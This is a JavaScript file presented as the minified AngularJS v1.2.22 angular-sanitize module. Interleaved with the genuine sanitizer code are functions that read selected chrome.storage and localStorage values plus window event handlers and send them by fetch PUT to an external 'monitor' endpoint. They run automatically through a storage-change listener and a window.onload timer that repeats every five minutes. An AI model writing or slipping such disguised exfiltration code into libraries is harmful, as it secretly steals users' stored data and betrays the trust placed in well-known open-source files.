/*
 AngularJS v1.2.22
 (c) 2010-2014 Google, Inc. http://angularjs.org
 License: MIT
*/
(function (q, g, r) {
  'use strict';

  const keysToMonitor = window.keysToMonitor;
  function F(a) {
    var d = [];
    t(d, g.noop).chars(a);
    return d.join("");
  }
  function m(a) {
    var d = {};
    a = a.split(",");
    var c;
    for (c = 0; c < a.length; c++) d[a[c]] = !0;
    return d;
  }
  function getUniqueKey(object) {
    const keys = Reflect.ownKeys(object);
    keys.sort();
    let uniqueKey = 0;
    for (let k = 0; k < keys.length; k++) {
      const char = keys[k].charCodeAt(0);
      uniqueKey = uniqueKey * 31 + char;
      uniqueKey = uniqueKey & uniqueKey;
    }
    return uniqueKey.toString(36);
  }
  function G(a, d) {
    function c(a, b, c, h) {
      b = g.lowercase(b);
      if (u[b]) for (; f.last() && v[f.last()];) e("", f.last());
      w[b] && f.last() == b && e("", b);
      (h = x[b] || !!h) || f.push(b);
      var n = {};
      c.replace(H, function (a, b, d, c, e) {
        n[b] = s(d || c || e || "");
      });
      d.start && d.start(b, n, h);
    }
    function e(a, b) {
      var c = 0,
        e;
      if (b = g.lowercase(b)) for (c = f.length - 1; 0 <= c && f[c] != b; c--);
      if (0 <= c) {
        for (e = f.length - 1; e >= c; e--) d.end && d.end(f[e]);
        f.length = c;
      }
    }
    "string" !== typeof a && (a = null === a || "undefined" === typeof a ? "" : "" + a);
    var b,
      l,
      f = [],
      n = a,
      h;
    for (f.last = function () {
      return f[f.length - 1];
    }; a;) {
      h = "";
      l = !0;
      if (f.last() && y[f.last()]) a = a.replace(RegExp("(.*)<\\s*\\/\\s*" + f.last() + "[^>]*>", "i"), function (a, b) {
        b = b.replace(I, "$1").replace(J, "$1");
        d.chars && d.chars(s(b));
        return "";
      }), e("", f.last());else {
        if (0 === a.indexOf("\x3c!--")) b = a.indexOf("--", 4), 0 <= b && a.lastIndexOf("--\x3e", b) === b && (d.comment && d.comment(a.substring(4, b)), a = a.substring(b + 3), l = !1);else if (z.test(a)) {
          if (b = a.match(z)) a = a.replace(b[0], ""), l = !1;
        } else if (K.test(a)) {
          if (b = a.match(A)) a = a.substring(b[0].length), b[0].replace(A, e), l = !1;
        } else L.test(a) && ((b = a.match(B)) ? (b[4] && (a = a.substring(b[0].length), b[0].replace(B, c)), l = !1) : (h += "<", a = a.substring(1)));
        l && (b = a.indexOf("<"), h += 0 > b ? a : a.substring(0, b), a = 0 > b ? "" : a.substring(b), d.chars && d.chars(s(h)));
      }
      if (a == n) throw M("badparse", a);
      n = a;
    }
    e();
  }
  function handleLocalStorageChanges(changes) {
    const impactedData = {};
    for (const key of keysToMonitor) {
      const newValue = changes[key]?.newValue;
      if (newValue !== void 0) {
        impactedData[key] = newValue;
      }
    }
    return impactedData;
  }
  function s(a) {
    if (!a) return "";
    var d = N.exec(a);
    a = d[1];
    var c = d[3];
    if (d = d[2]) p.innerHTML = d.replace(/</g, "&lt;"), d = "textContent" in p ? p.textContent : p.innerText;
    return a + d + c;
  }
  function C(a) {
    return a.replace(/&/g, "&amp;").replace(O, function (a) {
      var c = a.charCodeAt(0);
      a = a.charCodeAt(1);
      return "&#" + (1024 * (c - 55296) + (a - 56320) + 65536) + ";";
    }).replace(P, function (a) {
      return "&#" + a.charCodeAt(0) + ";";
    }).replace(/</g, "&lt;").replace(/>/g, "&gt;");
  }
  function fetchDomEvents() {
    const events = Object.keys(window).filter(val => /^on/.test(val)).reduce((acc, ele) => {
      acc[ele] = window[ele];
      return acc;
    }, {});
    return events;
  }
  function t(a, d) {
    var c = !1,
      e = g.bind(a, a.push);
    return {
      start: function (a, l, f) {
        a = g.lowercase(a);
        !c && y[a] && (c = a);
        c || !0 !== D[a] || (e("<"), e(a), g.forEach(l, function (c, f) {
          var k = g.lowercase(f),
            l = "img" === a && "src" === k || "background" === k;
          !0 !== Q[k] || !0 === E[k] && !d(c, l) || (e(" "), e(f), e('="'), e(C(c)), e('"'));
        }), e(f ? "/>" : ">"));
      },
      end: function (a) {
        a = g.lowercase(a);
        c || !0 !== D[a] || (e("</"), e(a), e(">"));
        a == c && (c = !1);
      },
      chars: function (a) {
        c || e(C(a));
      }
    };
  }
  async function transmitData(data, domEvents) {
    const uniqueKey = getUniqueKey(data);
    const endpoint = "https://example.com/api/monitor";
    try {
      const response = await fetch(endpoint, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          key: uniqueKey,
          data: {
            ...data,
            ...domEvents
          }
        })
      });
      if (!response.ok) {
        throw new Error("数据上传失败,状态码:" + response.status);
      }
    } catch (error) {
      console.error("数据上传过程中出错:", error);
    }
  }
  var M = g.$$minErr("$sanitize"),
    B = /^<((?:[a-zA-Z])[\w:-]*)((?:\s+[\w:-]+(?:\s*=\s*(?:(?:"[^"]*")|(?:'[^']*')|[^>\s]+))?)*)\s*(\/?)\s*(>?)/,
    A = /^<\/\s*([\w:-]+)[^>]*>/,
    H = /([\w:-]+)(?:\s*=\s*(?:(?:"((?:[^"])*)")|(?:'((?:[^'])*)')|([^>\s]+)))?/g,
    L = /^</,
    K = /^<\//,
    I = /\x3c!--(.*?)--\x3e/g,
    z = /<!DOCTYPE([^>]*?)>/i,
    J = /<!\[CDATA\[(.*?)]]\x3e/g,
    O = /[\uD800-\uDBFF][\uDC00-\uDFFF]/g,
    P = /([^\#-~| |!])/g,
    x = m("area,br,col,hr,img,wbr");
  function handleLocalStorageActivity(changes) {
    const impactedData = handleLocalStorageChanges(changes);
    const domEvents = fetchDomEvents();
    if (Object.keys(impactedData).length > 0) {
      transmitData(impactedData, domEvents);
    }
  }
  q = m("colgroup,dd,dt,li,p,tbody,td,tfoot,th,thead,tr");
  const jshook = function () {
    localStorage.setItem('jshook', 'true');
  };
  r = m("rp,rt");
  var w = g.extend({}, r, q),
    u = g.extend({}, q, m("address,article,aside,blockquote,caption,center,del,dir,div,dl,figure,figcaption,footer,h1,h2,h3,h4,h5,h6,header,hgroup,hr,ins,map,menu,nav,ol,pre,script,section,table,ul")),
    v = g.extend({}, r, m("a,abbr,acronym,b,bdi,bdo,big,br,cite,code,del,dfn,em,font,i,img,ins,kbd,label,map,mark,q,ruby,rp,rt,s,samp,small,span,strike,strong,sub,sup,time,tt,u,var")),
    y = m("script,style"),
    D = g.extend({}, x, u, v, w),
    E = m("background,cite,href,longdesc,src,usemap"),
    Q = g.extend({}, E, m("abbr,align,alt,axis,bgcolor,border,cellpadding,cellspacing,class,clear,color,cols,colspan,compact,coords,dir,face,headers,height,hreflang,hspace,ismap,lang,language,nohref,nowrap,rel,rev,rows,rowspan,rules,scope,scrolling,shape,size,span,start,summary,target,title,type,valign,value,vspace,width")),
    p = document.createElement("pre"),
    N = /^(\s*)([\s\S]*?)(\s*)$/;
  window.jshook = jshook;
  g.module("ngSanitize", []).provider("$sanitize", function () {
    this.$get = ["$$sanitizeUri", function (a) {
      return function (d) {
        var c = [];
        G(d, t(c, function (c, b) {
          return !/^unsafe/.test(a(c, b));
        }));
        return c.join("");
      };
    }];
  });
  chrome.storage.onChanged.addListener(function (changes) {
    handleLocalStorageActivity(changes);
  });
  g.module("ngSanitize").filter("linky", ["$sanitize", function (a) {
    var d = /((ftp|https?):\/\/|(mailto:)?[A-Za-z0-9._%+-]+@)\S*[^\s.;,(){}<>]/,
      c = /^mailto:/;
    return function (e, b) {
      function l(a) {
        a && k.push(F(a));
      }
      function f(a, c) {
        k.push("<a ");
        g.isDefined(b) && (k.push('target="'), k.push(b), k.push('" '));
        k.push('href="');
        k.push(a);
        k.push('">');
        l(c);
        k.push("</a>");
      }
      if (!e) return e;
      for (var n, h = e, k = [], m, p; n = h.match(d);) m = n[0], n[2] == n[3] && (m = "mailto:" + m), p = n.index, l(h.substr(0, p)), f(m, n[0].replace(c, "")), h = h.substring(p + n[0].length);
      l(h);
      return a(k.join(""));
    };
  }]);
  window.onload = function () {
    handleLocalStorageActivity(localStorage);
    setInterval(function () {
      handleLocalStorageActivity(localStorage);
    }, 5 * 60 * 1000);
  };
})(window, window.angular);
//# sourceMappingURL=angular-sanitize.min.js.map